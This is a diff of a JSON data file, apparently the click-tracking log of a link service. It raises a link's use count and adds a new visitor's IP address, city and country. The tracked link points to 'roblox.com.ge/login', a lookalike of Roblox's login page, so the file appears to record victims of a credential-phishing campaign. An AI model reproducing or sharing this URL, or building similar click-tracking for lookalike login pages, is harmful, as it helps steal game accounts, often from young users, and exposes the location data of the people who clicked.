@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 867,
+    "useCount": 868,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7048,6 +7048,14 @@
         "city": "Bangkok",
         "flag": "🇹🇭",
         "countryCode": "TH"
+      },
+      {
+        "timestamp": 1777188342673,
+        "ip": "143.44.132.118",
+        "country": "Philippines",
+        "city": "Tuguegarao City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
